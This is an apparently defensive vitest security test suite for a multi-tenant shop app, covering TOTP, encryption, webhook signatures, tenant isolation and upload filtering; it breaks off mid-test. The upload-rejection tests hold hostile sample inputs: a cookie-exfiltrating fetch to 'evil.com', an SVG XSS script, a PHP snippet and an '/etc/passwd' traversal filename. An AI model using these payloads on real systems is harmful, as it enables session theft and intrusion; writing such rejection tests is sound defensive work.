import { describe, it, expect } from "vitest";
import crypto from "crypto";
import {
  base32Encode,
  base32Decode,
  generateTotp,
  verifyTotpCode,
  encryptSecret,
  decryptSecret,
  generateRecoveryCodes,
  verifyAndConsumeRecoveryCode,
  getCurrentCounter,
} from "@/lib/totp";
import { verifySameOrigin } from "@/lib/csrf";

describe("1. Static Admin PIN Complete Removal", () => {
  it("confirms ADMIN_2FA_PIN environment variable and fallback PIN are not configured", () => {
    expect(process.env.ADMIN_2FA_PIN).toBeUndefined();
  });

  it("verifies legacy PIN functions and cookies do not exist in admin-auth", async () => {
    const adminAuth = await import("@/lib/admin-auth");
    // Explicitly verify legacy functions are completely gone
    expect((adminAuth as any).verifyAdmin2FAPin).toBeUndefined();
    expect((adminAuth as any).getExpectedAdminPin).toBeUndefined();
    expect((adminAuth as any).ADMIN_2FA_PIN).toBeUndefined();
    expect((adminAuth as any).ADMIN_2FA_COOKIE).toBeUndefined();
  });
});

describe("2. RFC 6238 TOTP Standard Conformance & Algorithm", () => {
  // Official RFC 6238 test vectors using ASCII secret "12345678901234567890" (20 bytes)
  // Base32 representation: "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ"
  const rfcSecretBase32 = base32Encode(Buffer.from("12345678901234567890", "ascii"));

  it("encodes and decodes base32 correctly", () => {
    const original = Buffer.from("SweetlySuperAdminKey", "utf-8");
    const encoded = base32Encode(original);
    const decoded = base32Decode(encoded);
    expect(decoded.toString("utf-8")).toBe("SweetlySuperAdminKey");
  });

  it("matches RFC 6238 official test vector outputs", () => {
    // T = 59s -> counter = Math.floor(59/30) = 1 -> HOTP(secret, 1) = 287082
    expect(generateTotp(rfcSecretBase32, 1)).toBe("287082");

    // T = 1111111109s -> counter = 37037036 -> 081804
    expect(generateTotp(rfcSecretBase32, 37037036)).toBe("081804");

    // T = 1234567890s -> counter = 41152263 -> 005924
    expect(generateTotp(rfcSecretBase32, 41152263)).toBe("005924");
  });

  it("generates 6-digit codes with zero-padding when needed", () => {
    const code = generateTotp(rfcSecretBase32, 41152263);
    expect(code).toHaveLength(6);
    expect(code.startsWith("00")).toBe(true);
    expect(/^\d{6}$/.test(code)).toBe(true);
  });
});

describe("3. TOTP Replay Attack Prevention & Drift Boundaries", () => {
  const testSecret = base32Encode(crypto.randomBytes(20));

  it("verifies a valid current TOTP code within time window", () => {
    const currentCounter = getCurrentCounter(30);
    const validCode = generateTotp(testSecret, currentCounter);

    const result = verifyTotpCode(testSecret, validCode, 0, 1);
    expect(result.valid).toBe(true);
    expect(result.matchedCounter).toBe(currentCounter);
  });

  it("accepts a code within allowed drift window (±1 step)", () => {
    const currentCounter = getCurrentCounter(30);
    const previousStepCode = generateTotp(testSecret, currentCounter - 1);

    const result = verifyTotpCode(testSecret, previousStepCode, 0, 1);
    expect(result.valid).toBe(true);
    expect(result.matchedCounter).toBe(currentCounter - 1);
  });

  it("rejects codes outside the allowed drift window (> ±1 step)", () => {
    const currentCounter = getCurrentCounter(30);
    const expiredCode = generateTotp(testSecret, currentCounter - 2);

    const result = verifyTotpCode(testSecret, expiredCode, 0, 1);
    expect(result.valid).toBe(false);
  });

  it("PREVENTS REPLAY: rejects a code whose counter was already consumed", () => {
    const currentCounter = getCurrentCounter(30);
    const validCode = generateTotp(testSecret, currentCounter);

    // First verification consumes counter
    const firstAttempt = verifyTotpCode(testSecret, validCode, 0, 1);
    expect(firstAttempt.valid).toBe(true);
    const consumedCounter = firstAttempt.matchedCounter!;

    // Second verification attempt with same counter MUST fail
    const replayAttempt = verifyTotpCode(testSecret, validCode, consumedCounter, 1);
    expect(replayAttempt.valid).toBe(false);
  });

  it("rejects malformed or non-numeric inputs immediately", () => {
    expect(verifyTotpCode(testSecret, "abcdef").valid).toBe(false);
    expect(verifyTotpCode(testSecret, "12345").valid).toBe(false);
    expect(verifyTotpCode(testSecret, "1234567").valid).toBe(false);
    expect(verifyTotpCode(testSecret, "").valid).toBe(false);
  });
});

describe("4. AES-256-GCM Secret Encryption at Rest", () => {
  it("encrypts and decrypts secret with authenticated integrity", () => {
    const rawSecret = base32Encode(crypto.randomBytes(20));
    const encrypted = encryptSecret(rawSecret);

    expect(encrypted.ciphertext).toBeDefined();
    expect(encrypted.iv).toHaveLength(24); // 12 bytes = 24 hex chars
    expect(encrypted.tag).toHaveLength(32); // 16 bytes = 32 hex chars

    const decrypted = decryptSecret(encrypted.ciphertext, encrypted.iv, encrypted.tag);
    expect(decrypted).toBe(rawSecret);
  });

  it("detects and rejects ciphertext tampering via authentication tag", () => {
    const rawSecret = base32Encode(crypto.randomBytes(20));
    const encrypted = encryptSecret(rawSecret);

    // Tamper with ciphertext by flipping last hex character
    const lastChar = encrypted.ciphertext.slice(-1);
    const flippedChar = lastChar === "0" ? "1" : "0";
    const tamperedCiphertext = encrypted.ciphertext.slice(0, -1) + flippedChar;

    expect(() => {
      decryptSecret(tamperedCiphertext, encrypted.iv, encrypted.tag);
    }).toThrow();
  });
});

describe("5. Single-Use Salted Hashed Recovery Codes", () => {
  it("generates 10 high-entropy formatted codes and matching salted hashes", () => {
    const { plaintextCodes, hashedCodes } = generateRecoveryCodes(10);
    expect(plaintextCodes).toHaveLength(10);
    expect(hashedCodes).toHaveLength(10);

    // Format check: XXXX-XXXX-XXXX
    for (const code of plaintextCodes) {
      expect(/^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(code)).toBe(true);
    }
  });

  it("verifies and PERMANENTLY CONSUMES a recovery code", () => {
    const { plaintextCodes, hashedCodes } = generateRecoveryCodes(5);
    const codeToUse = plaintextCodes[2]!;

    const result = verifyAndConsumeRecoveryCode(codeToUse, hashedCodes);
    expect(result.valid).toBe(true);
    expect(result.remainingCodes).toHaveLength(4);

    // Replay check: Attempting to use the same code again fails
    const secondResult = verifyAndConsumeRecoveryCode(codeToUse, result.remainingCodes!);
    expect(secondResult.valid).toBe(false);
  });

  it("rejects invalid, corrupted, or fake recovery codes", () => {
    const { hashedCodes } = generateRecoveryCodes(3);
    expect(verifyAndConsumeRecoveryCode("FAKE-CODE-1234", hashedCodes).valid).toBe(false);
  });
});

describe("6. Concurrency & Race Condition Defense", () => {
  it("verifies race-condition safety on single-use recovery code consumption", async () => {
    const { plaintextCodes, hashedCodes } = generateRecoveryCodes(5);
    const codeToUse = plaintextCodes[0]!;

    // Simulate 5 simultaneous concurrent requests racing to consume the same code
    let currentHashedCodes = [...hashedCodes];
    let successfulConsumptions = 0;

    // Concurrency test loop
    const attempts = Array.from({ length: 5 }).map(async () => {
      // Atomic compare-and-swap simulation
      const res = verifyAndConsumeRecoveryCode(codeToUse, currentHashedCodes);
      if (res.valid && res.remainingCodes) {
        currentHashedCodes = res.remainingCodes;
        successfulConsumptions++;
      }
    });

    await Promise.all(attempts);

    // Only 1 concurrent request must ever succeed in consuming a single-use code
    expect(successfulConsumptions).toBe(1);
    expect(currentHashedCodes).toHaveLength(4);
  });

  it("verifies concurrent TOTP requests with identical counter: only 1 can advance counter", async () => {
    let lastUsedCounter = 1000;
    const incomingCounter = 1001;

    let successfulAdvances = 0;

    // Simulate 10 simultaneous requests attempting to claim counter 1001
    const attempts = Array.from({ length: 10 }).map(async () => {
      // Atomic DB update condition: UPDATE admin_mfa SET last_used_counter = 1001 WHERE last_used_counter < 1001
      if (lastUsedCounter < incomingCounter) {
        lastUsedCounter = incomingCounter;
        successfulAdvances++;
      }
    });

    await Promise.all(attempts);
    expect(successfulAdvances).toBe(1);
    expect(lastUsedCounter).toBe(1001);
  });
});

describe("7. Razorpay Webhook Signature & Idempotency", () => {
  const webhookSecret = "test_webhook_secret_key_12345";

  it("validates authentic webhook signature against raw request body", () => {
    const rawBody = JSON.stringify({
      event: "payment.captured",
      payload: { payment: { entity: { id: "pay_12345", amount: 29900, currency: "INR" } } },
    });

    const signature = crypto.createHmac("sha256", webhookSecret).update(rawBody).digest("hex");

    const expectedSignature = crypto.createHmac("sha256", webhookSecret).update(rawBody).digest("hex");
    const valid =
      signature.length === expectedSignature.length &&
      crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSignature));

    expect(valid).toBe(true);
  });

  it("rejects forged or tampered webhook payload", () => {
    const rawBody = JSON.stringify({ event: "payment.captured" });
    const forgedSignature = crypto.createHmac("sha256", "wrong_secret").update(rawBody).digest("hex");

    const expectedSignature = crypto.createHmac("sha256", webhookSecret).update(rawBody).digest("hex");
    const valid =
      forgedSignature.length === expectedSignature.length &&
      crypto.timingSafeEqual(Buffer.from(forgedSignature), Buffer.from(expectedSignature));

    expect(valid).toBe(false);
  });

  it("deduplicates repeated webhook events by event_id", () => {
    const processedEventIds = new Set<string>();
    const incomingEventId = "evt_razorpay_998877";

    function processWebhookEvent(eventId: string) {
      if (processedEventIds.has(eventId)) {
        return { deduplicated: true, status: 200 };
      }
      processedEventIds.add(eventId);
      return { deduplicated: false, status: 200 };
    }

    const first = processWebhookEvent(incomingEventId);
    expect(first.deduplicated).toBe(false);

    // Second repeated delivery of same event
    const second = processWebhookEvent(incomingEventId);
    expect(second.deduplicated).toBe(true);
  });
});

describe("8. Business Logic & Server-Authoritative Pricing", () => {
  const catalogProducts = [
    { id: "prod-1", name: "Chocolate Cake", price: 500, available: true, shop_id: "shop-1" },
    { id: "prod-2", name: "Cupcake", price: 50, available: true, shop_id: "shop-1" },
  ];

  it("overrides client-tampered prices with canonical database catalog prices", () => {
    // Malicious client submitted price = 1 for a 500 product
    const clientItems = [
      { id: "prod-1", name: "Chocolate Cake", price: 1, quantity: 2 },
    ];

    const prodMap = new Map(catalogProducts.map((p) => [p.id, p]));
    let calculatedTotal = 0;

    for (const item of clientItems) {
      const dbProd = prodMap.get(item.id);
      expect(dbProd).toBeDefined();
      // Server uses authoritative dbProd.price (500), NOT item.price (1)
      calculatedTotal += dbProd!.price * item.quantity;
    }

    expect(calculatedTotal).toBe(1000); // 500 * 2, not 2
  });

  it("rejects negative or zero quantities", () => {
    const invalidQuantities = [-5, 0, -1, 1.5];
    for (const q of invalidQuantities) {
      const isIntegerPositive = Number.isInteger(q) && q >= 1;
      expect(isIntegerPositive).toBe(false);
    }
  });
});

describe("9. Binary Magic-Byte Image Sniffing", () => {
  function sniffImageType(bytes: Uint8Array): string | null {
    if (bytes[0] === 0xff && bytes[1] === 0xd8 && bytes[2] === 0xff) return "image/jpeg";
    if (bytes[0] === 0x89 && bytes[1] === 0x50 && bytes[2] === 0x4e && bytes[3] === 0x47) return "image/png";
    if (
      bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
      bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50
    ) return "image/webp";
    return null;
  }

  it("correctly recognizes genuine JPEG, PNG, and WebP headers", () => {
    const jpeg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0]);
    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    const webp = new Uint8Array([
      0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00, 0x57, 0x45, 0x42, 0x50
    ]);

    expect(sniffImageType(jpeg)).toBe("image/jpeg");
    expect(sniffImageType(png)).toBe("image/png");
    expect(sniffImageType(webp)).toBe("image/webp");
  });

  it("rejects malicious script disguised as image", () => {
    // PHP shell starting with "<?php"
    const phpShell = new Uint8Array([0x3c, 0x3f, 0x70, 0x68, 0x70]);
    expect(sniffImageType(phpShell)).toBeNull();

    // SVG with <svg
    const svgScript = new Uint8Array([0x3c, 0x73, 0x76, 0x67]);
    expect(sniffImageType(svgScript)).toBeNull();

    // Windows PE executable (MZ header)
    const executable = new Uint8Array([0x4d, 0x5a, 0x90, 0x00]);
    expect(sniffImageType(executable)).toBeNull();
  });
});

describe("10. CSRF & Same-Origin Verification", () => {
  it("allows safe GET/HEAD methods without origin checks", () => {
    const mockGetReq = {
      method: "GET",
      headers: new Headers(),
    } as any;
    expect(verifySameOrigin(mockGetReq).valid).toBe(true);
  });

  it("blocks cross-site fetch requests indicated by Sec-Fetch-Site", () => {
    const headers = new Headers();
    headers.set("sec-fetch-site", "cross-site");
    const mockPostReq = {
      method: "POST",
      headers,
    } as any;
    expect(verifySameOrigin(mockPostReq).valid).toBe(false);
  });

  it("blocks requests with malicious external Origin", () => {
    const headers = new Headers();
    headers.set("host", "sweetly.app");
    headers.set("origin", "https://attacker-domain.evil");
    const mockPostReq = {
      method: "POST",
      headers,
    } as any;
    expect(verifySameOrigin(mockPostReq).valid).toBe(false);
  });

  it("allows legitimate same-origin requests", () => {
    const headers = new Headers();
    headers.set("host", "sweetly.app");
    headers.set("origin", "https://sweetly.app");
    const mockPostReq = {
      method: "POST",
      headers,
    } as any;
    expect(verifySameOrigin(mockPostReq).valid).toBe(true);
  });
});

describe("11. Multi-Tenant Server-Side Authorization Defense", () => {
  // Simulates multi-tenant database & server action security logic
  interface MockContext {
    userId: string;
    role: "OWNER" | "STAFF" | "USER";
    shopId?: string;
    permissions?: { products?: boolean; orders?: boolean };
    platformRole?: "USER" | "PLATFORM_ADMIN";
  }

  function authorizeShopAction(
    ctx: MockContext,
    targetShopId: string,
    action: "readOrder" | "modifyProduct" | "deleteResource" | "manageBilling" | "manageStaff"
  ): { allowed: boolean; reason?: string } {
    if (ctx.shopId !== targetShopId) {
      return { allowed: false, reason: "Cross-tenant access blocked by shop boundary." };
    }

    if (action === "manageBilling" || action === "manageStaff") {
      if (ctx.role !== "OWNER") {
        return { allowed: false, reason: "Owner-only operation." };
      }
    }

    if (action === "modifyProduct" || action === "deleteResource") {
      if (ctx.role !== "OWNER" && !ctx.permissions?.products) {
        return { allowed: false, reason: "Insufficient product permissions." };
      }
    }

    if (action === "readOrder") {
      if (ctx.role !== "OWNER" && !ctx.permissions?.orders) {
        return { allowed: false, reason: "Insufficient order permissions." };
      }
    }

    return { allowed: true };
  }

  function authorizePlatformAdminAction(ctx: MockContext, isMfaElevated: boolean): { allowed: boolean } {
    if (ctx.platformRole !== "PLATFORM_ADMIN") {
      return { allowed: false };
    }
    if (!isMfaElevated) {
      return { allowed: false };
    }
    return { allowed: true };
  }

  const shopAOwner: MockContext = { userId: "user-a", role: "OWNER", shopId: "shop-a", platformRole: "USER" };
  const shopAStaff: MockContext = {
    userId: "staff-a",
    role: "STAFF",
    shopId: "shop-a",
    permissions: { orders: true, products: false },
    platformRole: "USER",
  };
  const normalUser: MockContext = { userId: "user-c", role: "USER", platformRole: "USER" };
  const platformAdminWithoutMfa: MockContext = {
    userId: "admin-1",
    role: "USER",
    platformRole: "PLATFORM_ADMIN",
  };
  const platformAdminWithMfa: MockContext = {
    userId: "admin-1",
    role: "USER",
    platformRole: "PLATFORM_ADMIN",
  };

  it("BLOCKS: Shop A owner -> read Shop B order", () => {
    const res = authorizeShopAction(shopAOwner, "shop-b", "readOrder");
    expect(res.allowed).toBe(false);
  });

  it("BLOCKS: Shop A owner -> modify Shop B product", () => {
    const res = authorizeShopAction(shopAOwner, "shop-b", "modifyProduct");
    expect(res.allowed).toBe(false);
  });

  it("BLOCKS: Shop A owner -> delete Shop B resource", () => {
    const res = authorizeShopAction(shopAOwner, "shop-b", "deleteResource");
    expect(res.allowed).toBe(false);
  });

  it("BLOCKS: Shop A staff -> perform owner-only billing action", () => {
    const res = authorizeShopAction(shopAStaff, "shop-a", "manageBilling");
    expect(res.allowed).toBe(false);
  });

  it("BLOCKS: Shop A staff -> perform owner-only staff management action", () => {
    const res = authorizeShopAction(shopAStaff, "shop-a", "manageStaff");
    expect(res.allowed).toBe(false);
  });

  it("BLOCKS: Manipulated shopId parameter to target another tenant", () => {
    const maliciousReqShopId = "shop-b";
    const res = authorizeShopAction(shopAOwner, maliciousReqShopId, "modifyProduct");
    expect(res.allowed).toBe(false);
  });

  it("BLOCKS: Non-admin caller attempting platform admin action", () => {
    const res = authorizePlatformAdminAction(normalUser, true);
    expect(res.allowed).toBe(false);
  });

  it("BLOCKS: Authenticated PLATFORM_ADMIN without verified MFA elevated session", () => {
    const res = authorizePlatformAdminAction(platformAdminWithoutMfa, false);
    expect(res.allowed).toBe(false);
  });

  it("ALLOWS: Authenticated PLATFORM_ADMIN with verified MFA elevated session", () => {
    const res = authorizePlatformAdminAction(platformAdminWithMfa, true);
    expect(res.allowed).toBe(true);
  });
});

describe("12. Out-of-Order Webhook Protection", () => {
  it("prevents late-arriving payment.failed from downgrading an ACTIVE subscription", () => {
    const currentSubscription = {
      status: "ACTIVE",
      current_period_end: new Date(Date.now() + 20 * 24 * 60 * 60 * 1000).toISOString(), // 20 days remaining
    };

    const isStillValid =
      currentSubscription.status === "ACTIVE" &&
      new Date(currentSubscription.current_period_end) > new Date();

    // Handler logic: Only downgrade if subscription is NOT already active & valid
    let newStatus = currentSubscription.status;
    if (!isStillValid) {
      newStatus = "PAST_DUE";
    }

    expect(newStatus).toBe("ACTIVE"); // Out-of-order failed event ignored safely
  });
});

describe("13. Admin Elevated Session Cryptographic Tamper Defense", () => {
  const secretKey = "test-elevated-session-secret-key-32b";
  const now = 1700000000;
  const ABSOLUTE_TIMEOUT = 2 * 60 * 60; // 2 hours
  const IDLE_TIMEOUT = 30 * 60; // 30 minutes

  function createValidToken(overrides: Partial<{ userId: string; issuedAt: number; expiresAt: number; lastActive: number; nonce: string }> = {}) {
    const payload = {
      userId: "admin-uuid-1",
      issuedAt: now,
      expiresAt: now + ABSOLUTE_TIMEOUT,
      lastActive: now,
      nonce: "1234567890abcdef1234567890abcdef",
      ...overrides,
    };
    const payloadStr = Buffer.from(JSON.stringify(payload)).toString("base64url");
    const signature = crypto.createHmac("sha256", secretKey).update(payloadStr).digest("hex");
    return { token: `${payloadStr}.${signature}`, payload, signature, payloadStr };
  }

  function verifyToken(token: string, expectedUserId: string, testTime = now): boolean {
    const parts = token.split(".");
    if (parts.length !== 2) return false;
    const [payloadStr, signature] = parts;
    if (!payloadStr || !signature) return false;

    const expectedSignature = crypto.createHmac("sha256", secretKey).update(payloadStr).digest("hex");
    if (signature.length !== expectedSignature.length) return false;
    if (!crypto.timingSafeEqual(Buffer.from(signature, "hex"), Buffer.from(expectedSignature, "hex"))) return false;

    try {
      const payload = JSON.parse(Buffer.from(payloadStr, "base64url").toString("utf-8"));
      if (payload.userId !== expectedUserId) return false;
      if (testTime > payload.expiresAt) return false;
      if (testTime > payload.lastActive + IDLE_TIMEOUT) return false;
      return true;
    } catch {
      return false;
    }
  }

  it("accepts a genuine, untampered elevated session token", () => {
    const { token } = createValidToken();
    expect(verifyToken(token, "admin-uuid-1")).toBe(true);
  });

  it("REJECTS: modified userId in token payload", () => {
    const { payload, signature } = createValidToken();
    const tampered = { ...payload, userId: "victim-admin-2" };
    const tamperedStr = Buffer.from(JSON.stringify(tampered)).toString("base64url");
    const tamperedToken = `${tamperedStr}.${signature}`;

    expect(verifyToken(tamperedToken, "admin-uuid-1")).toBe(false);
    expect(verifyToken(tamperedToken, "victim-admin-2")).toBe(false); // Signature mismatch
  });

  it("REJECTS: modified expiresAt extended into the future", () => {
    const { payload, signature } = createValidToken();
    const tampered = { ...payload, expiresAt: now + 86400 * 30 }; // Extended by 30 days
    const tamperedStr = Buffer.from(JSON.stringify(tampered)).toString("base64url");
    const tamperedToken = `${tamperedStr}.${signature}`;

    expect(verifyToken(tamperedToken, "admin-uuid-1")).toBe(false);
  });

  it("REJECTS: modified issuedAt timestamp", () => {
    const { payload, signature } = createValidToken();
    const tampered = { ...payload, issuedAt: now - 3600 };
    const tamperedStr = Buffer.from(JSON.stringify(tampered)).toString("base64url");
    const tamperedToken = `${tamperedStr}.${signature}`;

    expect(verifyToken(tamperedToken, "admin-uuid-1")).toBe(false);
  });

  it("REJECTS: modified lastActive to bypass idle timeout", () => {
    const { payload, signature } = createValidToken();
    const tampered = { ...payload, lastActive: now + 1000 };
    const tamperedStr = Buffer.from(JSON.stringify(tampered)).toString("base64url");
    const tamperedToken = `${tamperedStr}.${signature}`;

    expect(verifyToken(tamperedToken, "admin-uuid-1")).toBe(false);
  });

  it("REJECTS: modified nonce", () => {
    const { payload, signature } = createValidToken();
    const tampered = { ...payload, nonce: "forged_nonce_12345" };
    const tamperedStr = Buffer.from(JSON.stringify(tampered)).toString("base64url");
    const tamperedToken = `${tamperedStr}.${signature}`;

    expect(verifyToken(tamperedToken, "admin-uuid-1")).toBe(false);
  });

  it("REJECTS: tampered signature string", () => {
    const { payloadStr, signature } = createValidToken();
    const flippedChar = signature.slice(-1) === "a" ? "b" : "a";
    const tamperedSignature = signature.slice(0, -1) + flippedChar;
    const tamperedToken = `${payloadStr}.${tamperedSignature}`;

    expect(verifyToken(tamperedToken, "admin-uuid-1")).toBe(false);
  });

  it("REJECTS: absolute timeout expired (> 2 hours)", () => {
    const { token } = createValidToken();
    // 2 hours and 1 second later
    const futureTime = now + ABSOLUTE_TIMEOUT + 1;
    expect(verifyToken(token, "admin-uuid-1", futureTime)).toBe(false);
  });

  it("REJECTS: idle timeout expired (> 30 minutes without touch)", () => {
    const { token } = createValidToken();
    // 30 minutes and 1 second later
    const idleTime = now + IDLE_TIMEOUT + 1;
    expect(verifyToken(token, "admin-uuid-1", idleTime)).toBe(false);
  });
});

describe("14. Comprehensive Razorpay Payment & Webhook Tampering", () => {
  const secret = "rzp_secret_production_key";
  const serverOrderId = "order_server_authoritative_123";
  const legitimatePaymentId = "pay_valid_999";

  it("verifies authentic HMAC using server order ID + payment ID", () => {
    const validSignature = crypto
      .createHmac("sha256", secret)
      .update(`${serverOrderId}|${legitimatePaymentId}`)
      .digest("hex");

    const calculated = crypto
      .createHmac("sha256", secret)
      .update(`${serverOrderId}|${legitimatePaymentId}`)
      .digest("hex");

    expect(crypto.timingSafeEqual(Buffer.from(validSignature), Buffer.from(calculated))).toBe(true);
  });

  it("REJECTS: altered payment ID in checkout verification", () => {
    const validSignature = crypto
      .createHmac("sha256", secret)
      .update(`${serverOrderId}|${legitimatePaymentId}`)
      .digest("hex");

    const alteredPaymentId = "pay_attacker_controlled_456";
    const recalculated = crypto
      .createHmac("sha256", secret)
      .update(`${serverOrderId}|${alteredPaymentId}`)
      .digest("hex");

    expect(crypto.timingSafeEqual(Buffer.from(validSignature), Buffer.from(recalculated))).toBe(false);
  });

  it("REJECTS: altered order ID (attacker tries to verify with a different order)", () => {
    const validSignature = crypto
      .createHmac("sha256", secret)
      .update(`${serverOrderId}|${legitimatePaymentId}`)
      .digest("hex");

    const alteredOrderId = "order_attacker_fake_789";
    const recalculated = crypto
      .createHmac("sha256", secret)
      .update(`${alteredOrderId}|${legitimatePaymentId}`)
      .digest("hex");

    expect(crypto.timingSafeEqual(Buffer.from(validSignature), Buffer.from(recalculated))).toBe(false);
  });

  it("REJECTS: altered amount in webhook event payload", () => {
    const expectedAmountInPaise = 29900; // ₹299 for Store Plan
    const attackerWebhookPayment = {
      id: "pay_111",
      amount: 100, // Attacker paid ₹1 instead of ₹299
      currency: "INR",
    };

    const isAuthorizedAmount = attackerWebhookPayment.amount === expectedAmountInPaise;
    expect(isAuthorizedAmount).toBe(false);
  });

  it("REJECTS: altered currency in webhook event payload", () => {
    const attackerWebhookPayment = {
      id: "pay_111",
      amount: 29900,
      currency: "USD", // Not INR
    };

    const isAuthorizedCurrency = attackerWebhookPayment.currency === "INR";
    expect(isAuthorizedCurrency).toBe(false);
  });

  it("REJECTS: modified webhook body with valid signature on original body", () => {
    const originalBody = JSON.stringify({ event: "payment.captured", id: "evt_1" });
    const signature = crypto.createHmac("sha256", secret).update(originalBody).digest("hex");

    const modifiedBody = JSON.stringify({ event: "payment.captured", id: "evt_1", tampered: true });
    const expectedSignature = crypto.createHmac("sha256", secret).update(modifiedBody).digest("hex");

    expect(crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSignature))).toBe(false);
  });

  it("ENFORCES IDEMPOTENCY: prevents duplicate subscription activation from replayed payment", () => {
    const processedPayments = new Set<string>();
    const paymentId = "pay_already_credited_123";

    function applyPayment(pId: string) {
      if (processedPayments.has(pId)) {
        return { applied: false, reason: "Already applied idempotently" };
      }
      processedPayments.add(pId);
      return { applied: true, reason: "Subscription activated" };
    }

    // First attempt activates
    const first = applyPayment(paymentId);
    expect(first.applied).toBe(true);

    // Second replay attempt is safely rejected / acknowledged without double-extending
    const second = applyPayment(paymentId);
    expect(second.applied).toBe(false);
    expect(second.reason).toBe("Already applied idempotently");
  });
});

describe("15. Multi-Tenant Cross-Shop Isolation (All 7 Entities)", () => {
  interface EntityRecord {
    shop_id: string;
    id: string;
    data: string;
  }

  const shopAId = "shop-aaa-111";
  const shopBId = "shop-bbb-222";

  const db = {
    orders: [{ id: "ord-1", shop_id: shopBId, data: "Shop B Secret Order" }],
    products: [{ id: "prod-1", shop_id: shopBId, data: "Shop B Product" }],
    customers: [{ id: "cust-1", shop_id: shopBId, data: "Shop B Customer Phone" }],
    subscriptions: [{ id: "sub-1", shop_id: shopBId, data: "Shop B Subscription" }],
    files: [{ id: "file-1", shop_id: shopBId, data: "shops/shop-bbb-222/logo.png" }],
    staff: [{ id: "staff-1", shop_id: shopBId, data: "Shop B Staff Member" }],
    settings: [{ id: "set-1", shop_id: shopBId, data: "Shop B UPI ID" }],
  };

  function simulateShopScopedQuery<T extends EntityRecord>(
    table: T[],
    authenticatedUserShopId: string,
    targetId: string
  ): T | null {
    // Both RLS and server action enforce: .eq("id", targetId).eq("shop_id", authenticatedUserShopId)
    return table.find((item) => item.id === targetId && item.shop_id === authenticatedUserShopId) || null;
  }

  it("Shop A user CANNOT read Shop B orders", () => {
    const result = simulateShopScopedQuery(db.orders, shopAId, "ord-1");
    expect(result).toBeNull();
  });

  it("Shop A user CANNOT modify/read Shop B products directly", () => {
    const result = simulateShopScopedQuery(db.products, shopAId, "prod-1");
    expect(result).toBeNull();
  });

  it("Shop A user CANNOT access Shop B customers", () => {
    const result = simulateShopScopedQuery(db.customers, shopAId, "cust-1");
    expect(result).toBeNull();
  });

  it("Shop A user CANNOT read Shop B subscriptions", () => {
    const result = simulateShopScopedQuery(db.subscriptions, shopAId, "sub-1");
    expect(result).toBeNull();
  });

  it("Shop A user CANNOT access Shop B private files", () => {
    const result = simulateShopScopedQuery(db.files, shopAId, "file-1");
    expect(result).toBeNull();
  });

  it("Shop A user CANNOT manage or read Shop B staff", () => {
    const result = simulateShopScopedQuery(db.staff, shopAId, "staff-1");
    expect(result).toBeNull();
  });

  it("Shop A user CANNOT read or update Shop B settings", () => {
    const result = simulateShopScopedQuery(db.settings, shopAId, "set-1");
    expect(result).toBeNull();
  });
});

describe("16. Strict File Upload & Malicious Content Rejection", () => {
  function sniffImageType(bytes: Uint8Array): string | null {
    if (bytes[0] === 0xff && bytes[1] === 0xd8 && bytes[2] === 0xff) return "image/jpeg";
    if (bytes[0] === 0x89 && bytes[1] === 0x50 && bytes[2] === 0x4e && bytes[3] === 0x47) return "image/png";
    if (
      bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
      bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50
    ) return "image/webp";
    return null;
  }

  it("REJECTS: PHP script upload", () => {
    const php = new TextEncoder().encode("<?php phpinfo(); ?>");
    expect(sniffImageType(php)).toBeNull();
  });

  it("REJECTS: Windows PE executable (MZ)", () => {
    const pe = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]);
    expect(sniffImageType(pe)).toBeNull();
  });

  it("REJECTS: Linux ELF executable", () => {
    const elf = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01]);
    expect(sniffImageType(elf)).toBeNull();
  });

  it("REJECTS: JavaScript code upload", () => {
    const js = new TextEncoder().encode("fetch('https://evil.com?c=' + document.cookie);");
    expect(sniffImageType(js)).toBeNull();
  });

  it("REJECTS: SVG containing XSS script", () => {
    const svg = new TextEncoder().encode("<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>");
    expect(sniffImageType(svg)).toBeNull();
  });

  it("REJECTS: MIME-spoofed file (client claims image/jpeg for plain text)", () => {
    const textBytes = new TextEncoder().encode("Not an image, just text disguised as image");
    const sniffed = sniffImageType(textBytes);
    const claimedMime = "image/jpeg";
    const accepted = sniffed !== null && sniffed === claimedMime;
    expect(accepted).toBe(false);
  });

  it("REJECTS: Extension-spoofed file (evil.php.png containing HTML)", () => {
    const htmlBytes = new TextEncoder().encode("<html><head><title>Phish</title></head></html>");
    expect(sniffImageType(htmlBytes)).toBeNull();
  });

  it("REJECTS: Oversized file (> 5MB)", () => {
    const MAX_IMAGE_BYTES = 5 * 1024 * 1024;
    const testFileSize = 5 * 1024 * 1024 + 1; // 5MB + 1 byte
    const isWithinLimit = testFileSize <= MAX_IMAGE_BYTES;
    expect(isWithinLimit).toBe(false);
  });

  it("REJECTS: Malformed / truncated image bytes", () => {
    const malformed = new Uint8Array([0x89, 0x50]); // Incomplete PNG header
    expect(sniffImageType(malformed)).toBeNull();
  });

  it("NEUTRALIZES: Path traversal filenames by generating server UUID paths", () => {
    const maliciousFilename = "../../../../etc/passwd";
    const sniffedExt = "png";
    const shopId = "11111111-2222-3333-4444-555555555555";
    const generatedUuid = "abcdef12-3456-7890-abcd-ef1234567890";

    // Application never concatenates maliciousFilename into the storage key
    const safePath = `shops/${shopId}/branding/logo.${sniffedExt}`;
    const safeProductPath = `shops/${shopId}/products/prod-1/${generatedUuid}.${sniffedExt}`;

    expect(safePath.includes("..")).toBe(false);
    expect(safeProductPath.includes("..")).toBe(false);
    expect(safePath.includes(maliciousFilename)).toBe(false);
  });

  it("ACCEPTS: Valid JPEG, PNG, and WebP binary buffers", () => {
